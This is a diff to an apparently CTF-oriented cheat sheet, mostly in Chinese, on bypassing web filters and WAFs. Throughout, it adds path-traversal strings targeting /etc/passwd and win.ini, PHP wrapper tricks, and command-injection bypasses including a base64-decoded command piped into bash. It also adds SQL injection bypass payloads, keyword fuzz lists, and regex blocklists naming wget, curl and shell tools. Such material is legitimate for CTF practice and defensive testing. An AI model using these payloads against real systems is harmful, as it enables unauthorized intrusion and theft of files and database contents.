@@ -23,11 +23,15 @@
 | %00           | ?filename=.%00./file.php <br>/etc/passwd%00.jpg        |
 | \             | ?filename=..%5c..%5c/windows/win.ini                   |
 
-## bypass filter_var($url, FILTER_VALIDATE_URL)
+## bypass functions
+
+## bypass detail
+
+### bypass filter_var($url, FILTER_VALIDATE_URL)
 
 `?url=http://`
 
-## bypass file_get_contents($text,'r')==="welcome to the zjctf"
+### bypass file_get_contents($text,'r')==="welcome to the zjctf"
 
 `?text=data://test/plain,welcome&file=php://filter/resource=useless.php`
 
@@ -43,6 +47,15 @@ copy /b 1.jpg+2.jpg 3 /y
 # Linux/Windows shell bypass
 
 [Bypass Linux Shell Restrictions](https://mp.weixin.qq.com/s/8QTax87lorWNnOQR8p1ORQ)
+
+## Test Regex
+
+```bash
+# Linux
+/dir/ls|bash|tac|nl|more|less|head|base64|wget|curl|tail|vi|cat|tee|od|grep|sed|bzmore|bzless|pcre|paste|python|diff|file|echo|touch|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i
+# Windows
+/type/
+```
 
 | windows 管道符   | Description                  | 示例                   |
 | ---------------- | ---------------------------- | ---------------------- |
@@ -87,6 +100,12 @@ copy /b 1.jpg+2.jpg 3 /y
     注意: 使用| 这不是连续执行, 只能一级传一级,要连续就用127.0.0.1;ls
 ```
 
+```bash
+绕过技巧:  base64-- echo "bHMgLWxoYSAv"|base64 -d|bash > test.png
+写入文件: dir |tee 1.txt
+新建文件: touch 1.txt
+```
+
 # Sql bypass
 
 - https://github.com/Xyntax/waf-bypass/blob/master/payload/sql.txt
@@ -94,12 +113,40 @@ copy /b 1.jpg+2.jpg 3 /y
 - [sql 注入 bypass waf 工具（1 月 18 日更新）](https://mp.weixin.qq.com/s/qritLmRwP-Q5OLskxNWSVw)
 - [Sql 注入过安全狗](https://mp.weixin.qq.com/s/Ighou2aYORZ7rGvJfpeeHg)
 
-| bypass |                     |                                                                                                                                            |
-| ------ | ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
-| 大小写 |                     |                                                                                                                                            |
-| =      | like/regexp         | <> 等价于 !=                                                                                                                               |
-| 空格   | /\*\*/ 或 +         | php 可用 %09、%0A、 %0B、 %0C、 %0D、%A0、%20 <br>and/or 后面可以跟上偶数个!、~可以替代空格 <br>and/or 前的空格可用省略. <br>'后空格可省略 |
-| select | [handler](#handler) |                                                                                                                                            |
+解题提示：
+
+- 猜 列为 flag, 表为 flag , select flag from flag
+
+| bypass     |                                            |                                                                                                                                            |
+| ---------- | ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
+| 大小写     |                                            |                                                                                                                                            |
+| =          | like/regexp                                | 或用 !<>                                                                                                                                   |
+| 空格       | /\*\*/ 或 +                                | php 可用 %09、%0A、 %0B、 %0C、 %0D、%A0、%20 <br>and/or 后面可以跟上偶数个!、~可以替代空格 <br>and/or 前的空格可用省略. <br>'后空格可省略 |
+| select     | [handler](#handler)/updatexml/extractvalue |                                                                                                                                            |
+| 16 进制    | hex 自动转字符                             | 0x61 即 a                                                                                                                                  |
+| 1000       | `992\|8`<br>--1000<br>~~1000               |
+| **Mysql8** |                                            |
+| select     | [table](#sqltable)                         | table myuser == select \* from myuser                                                                                                      |
+
+## Test Regex
+
+见 sql_fuzz.json
+
+```bash
+/**/,sElect,uNion,(),	,oR,aNd,taBLE,bEtween,like,regexp, ,",',^,+,Hex,0b1111101000,?,sHow,dEsc,orDer By,--,~~,`,CONcat,aLter,Columns,*,UpdateXml,ExtractValue,load_file,//,sUbstr,mId,=,mId,lIke,iNto,fIle,iF,sLeep,bEnchmark,lEft,rIght,^,&,||,>,<,#,-,aScii,oRd,sT_,fLoor,gEomfromtext,x(,pOw,cAse,rPad,rEpeat,jOin,bUffer,iNcrement,iNfo,sYs,lImit,oRder,bY,iNsert,uPdate,dElete,iNform
+dAtabases,tAbles,uSer,0x,cHar
+mysql.innodb_index_stats,mysql.innodb_table_stats,sys.schema_auto_increment_columns
+DESC `table name`
+SHOW COLUMNS FROM `table name`
+```
+
+```sh
+-- 绕过  select b from (select 1,2,3 as b union select * from admin)a;
+只能是数字: '0' + 使用2次hex + '0'        -- 网鼎杯 2018 unfinish/ctfshow内部赛签到
+password在字段名  有password，passwd，pwd -- 见writeup MySQL查询的按位比较
+看: 常见的SQL注入考点 CTF-123458
+mysql8 (https://mp.weixin.qq.com/s/U65QGzQoR1EY0QFaTy5--g) , table命令
+```
 
 ## sql/handler
 
@@ -108,4 +155,15 @@ handler auth_permission open as yunensec;
 handler yunensec read first;
 handler yunensec read next;
 handler yunensec close;
+```
+
+## sql/table
+
+[for mysql8](https://mp.weixin.qq.com/s/U65QGzQoR1EY0QFaTy5--g)
+
+1.TABLE 始终显示表的所有列 2.TABLE 不允许对行进行任意过滤，即 TABLE 不支持任何 WHERE 子句
+
+```sh
+table user order by 2
+table user limit 2
 ```
